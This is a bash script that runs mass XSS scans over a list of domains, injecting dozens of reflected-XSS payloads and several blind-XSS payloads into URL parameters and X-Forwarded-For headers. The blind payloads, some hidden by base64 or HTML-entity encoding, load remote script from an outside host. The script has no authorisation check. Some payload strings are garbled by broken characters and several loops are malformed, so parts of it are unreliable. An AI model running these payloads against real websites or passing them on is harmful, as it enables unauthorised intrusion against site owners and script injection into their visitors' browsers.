#!/bin/bash

#Xss Scanner  on urls


host=$1

#check

if [ "$1" == "" ]
then
    echo -e "\033[33m[+]Usage:\033[m $0 domains.txt  "
    echo -e "\033[31m[+]Note: path of xss urls --> \033[m shazam-output/$domain/gf/xss.txt"


    exit
fi


for domain in $(cat $host);
do


mkdir -p  shazam-output  shazam-output/$domain   shazam-output/$domain/tmp shazam-output/$domain/vulnerabilities  shazam-output/$domain/vulnerabilities/xss_scan
chmod +rwx shazam-output/

echo -e "\033[32m_____________________________________________________________________________________________________________________________________\033[m"
echo -e "\033[33m[+] Xss Scanner on urls Started  $domain \033[m" | notify -silent -bulk
date    '+DATE: %m/%d/%y%nTIME:%r' | notify -silent -bulk
echo -e "\033[32m_____________________________________________________________________________________________________________________________________\033[m"

#reflected-Xss-checking
echo -e "\033[36m[+]  reflected-Xss-checking...freq Gxss.txt  $domain \033[m"
sleep 2

#payloads
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '"><img src=x onerror=alert(1)>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace  '"><script>alert(1)</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found  
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '"><svg/onload=alert()>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found 
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '"><img src onerror=alert(1)>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found 
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '"autofocus onfocus=alert(1)//' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found 
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '</script><script>alert(1)</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found 
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace 'javascript:alert(1)' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found 
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace "'-alert(1)-'"  | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found 
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace "\'-alert(1)//" | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found 
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace  '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" &&  echo -e "$host \033[91m Vullnerable \e[0m \n";done |anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found 
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '"><img src=x onerror=alert(1)>'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" &&  echo -e "$host \033[91m Vullnerable \e[0m \n";done |anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found 

cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<script>alert(123);</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<ScRipT>alert("XSS");</ScRipT>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<script>alert(123)</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<script>alert("hellox worldss");</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<script>alert(�XSS�)</script> ' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<script>alert(�XSS�);</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<script>alert(�XSS�)</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '�><script>alert(�XSS�)</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<script>alert(/XSS�)</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<script>alert(/XSS/)</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '</script><script>alert(1)</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '�; alert(1);' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '�)alert(1);//' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<ScRiPt>alert(1)</sCriPt>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<IMG SRC=jAVasCrIPt:alert(�XSS�)>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<IMG SRC=�javascript:alert(�XSS�);�>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<IMG SRC=javascript:alert(&quot;XSS&quot;)>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<IMG SRC=javascript:alert(�XSS�)>      ' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<img src=xss onerror=alert(1)>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found
cat shazam-output/$domain/tmp/Gxss.txt | grep "=" | qsreplace '<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/xss-found



#blind-Xss-checking
#.................................................................................................

echo -e "\033[32m_____________________________________________________________________________________________________________________________________\033[m"
echo -e "\033[36m[+] blind -Xss-checking...freq  \033[m"

#blind-paload

cat shazam-output/$domain/gf/xss.txt | grep "=" | qsreplace '"><script src="https://js.rip/llpuzsq3gz"></script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "=" | qsreplace "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/llpuzsq3gz\';document.body.appendChild(a)')" | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "=" | qsreplace '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2xscHV6c3EzZ3oiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "=" | qsreplace '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2xscHV6c3EzZ3oiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "=" | qsreplace '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2xscHV6c3EzZ3oiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "=" | qsreplace '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/llpuzsq3gz&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "=" | qsreplace '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://js.rip/llpuzsq3gz");a.send();</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "=" | qsreplace '<script>$.getScript("https://js.rip/llpuzsq3gz")</script>' | freq | grep -iv "Not Vulnerable"| anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found



cat shazam-output/$domain/gf/xss.txt | grep "="  | qsreplace '"><script src="https://js.rip/llpuzsq3gz"></script>'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs '"><script src="https://js.rip/llpuzsq3gz"></script>' &&  echo -e "$host \033[91m Vullnerable \e[0m \n";done | anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "="  | qsreplace "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/llpuzsq3gz\';document.body.appendChild(a)')"| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/llpuzsq3gz\';document.body.appendChild(a)')" &&  echo -e "$host \033[91m Vullnerable \e[0m \n";done | anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "="  | qsreplace '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2xscHV6c3EzZ3oiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2xscHV6c3EzZ3oiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>' &&  echo -e "$host \033[91m Vullnerable \e[0m \n";done | anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "="  | qsreplace '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2xscHV6c3EzZ3oiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2xscHV6c3EzZ3oiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>' &&  echo -e "$host \033[91m Vullnerable \e[0m \n";done | anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "="  | qsreplace '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2xscHV6c3EzZ3oiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2xscHV6c3EzZ3oiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>' &&  echo -e "$host \033[91m Vullnerable \e[0m \n";done | anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "="  | qsreplace '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/llpuzsq3gz&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/llpuzsq3gz&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">' &&  echo -e "$host \033[91m Vullnerable \e[0m \n";done | anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "="  | qsreplace '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://js.rip/llpuzsq3gz");a.send();</script>'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://js.rip/llpuzsq3gz");a.send();</script>' &&  echo -e "$host \033[91m Vullnerable \e[0m \n";done | anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found
cat shazam-output/$domain/gf/xss.txt | grep "="  | qsreplace '<script>$.getScript("https://js.rip/llpuzsq3gz")</script>'| while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs '<script>$.getScript("https://js.rip/llpuzsq3gz")</script>' &&  echo -e "$host \033[91m Vullnerable \e[0m \n";done | anew shazam-output/$domain/vulnerabilities/xss_scan/blind-xss-found


#blind-payload
echo -e "\033[32m_____________________________________________________________________________________________________________________________________\033[m"
echo -e "\033[36m[+] blind Xss-checking...bxss  xss-urls.txt  \033[m"
cat shazam-output/$domain/gf/xss.txt |grep http | awk -F "," '{print $1}' | uro | sort -u | bxss -concurrency 100  -payload  '"><script src="https://js.rip/llpuzsq3gz"></script>'   -header "X-Forwarded-For" | anew shazam-output/$domain/vulnerabilities/xss_scan/bxss.txt
cat shazam-output/$domain/gf/xss.txt |grep http | awk -F "," '{print $1}' | uro | sort -u | bxss -concurrency 100  -payload  '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2xscHV6c3EzZ3oiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>'   -header "X-Forwarded-For" | anew shazam-output/$domain/vulnerabilities/xss_scan/bxss.txt


cat shazam-output/$domain/gf/xss.txt |grep http | awk -F "," '{print $1}' | uro | sort -u | bxss -concurrency 100  -payload  '"><script src="https://js.rip/llpuzsq3gz"></script>'  -parameters | anew shazam-output/$domain/vulnerabilities/xss_scan/bxss.txt
cat shazam-output/$domain/gf/xss.txt |grep http | awk -F "," '{print $1}' | uro | sort -u | bxss -concurrency 100  -payload  '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2xscHV6c3EzZ3oiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>'  -parameters | anew shazam-output/$domain/vulnerabilities/xss_scan/bxss.txt


#gxss
echo -e "\033[32m[+] Finding-Endpints for Gxss Started....  \033[m"  
cat shazam-output/$domain/gf/xss.txt |grep "="| sort -u |uro|Gxss -c 300 -p hello  -u "Google Bot" |  anew shazam-output/$domain/tmp/Gxss.txt



#sleep 2
#rm  shazam-output/$domain/gf/xss.txt
#xss-scan


#notify-xss
#echo -e "\033[32m............................................................................................................................................... \033[m"  | notify -silent -bulk

#echo -e "\033[32m ❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗\033[m"  | notify -silent -bulk

#cat shazam-output/$domain/vulnerabilities/xss_scan/xss-found
 
#echo -e "\033[32m ❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗❗\033[m"  | notify -silent -bulk
#echo -e "\033[32m............................................................................................................................................... \033[m"  | notify -silent -bulk



echo -e "\033[31m_____________________________________________________________________________________________________________________________________\033[m"
echo -e "\033[33m[+] Xss Scanner on urls   Done!  $domain \033[m" |notify -silent -bulk
date    '+DATE: %m/%d/%y%nTIME:%r' |notify -silent -bulk
echo -e "\033[32m[+] Output Save in -->  shazam-output/$domain/ \033[m"
echo -e "\033[32m[+] For Blind xss check email and xsshunter.trufflesecurity.com \033[m"|notify -silent -bulk
echo -e "\033[32m............................................................................................................................................... \033[m"  | notify -silent -bulk


done
